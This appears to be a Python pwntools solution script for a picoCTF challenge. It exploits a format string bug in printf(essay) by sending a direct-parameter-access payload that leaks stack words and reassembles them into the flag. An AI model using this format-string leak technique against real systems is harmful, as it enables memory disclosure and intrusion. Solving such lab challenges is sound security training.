from pwn import *
import struct

p = remote('mercury.picoctf.net', 6989)

## Read until the prompt
p.readuntil('lio\n')
p.send('1\n')
p.readuntil('token?\n')

'''
The bug is at the line with:
    printf(essay)

It allows us to exploit it via a format string bug. Since the data from the flag is on the stack
we can use this to print it out. After some trial and error I found the flag data beginning at the 14th quadword.

So, using direct parameter access it was easy to print out
'''

response = '%15$p.%16$p.%17$p.%18$p.%19$p.%20$p.%21$p.%22$p.%23$p.%24$p.\n'

p.send(response)

p.readuntil('0x')

data = p.readline().rstrip().split(b'.')
flag = b''

print(data)

for x in data:
    if x == b'':
        continue

    flag += struct.pack('I', int(x, 16))

print('Flag: ', flag)

p.close()

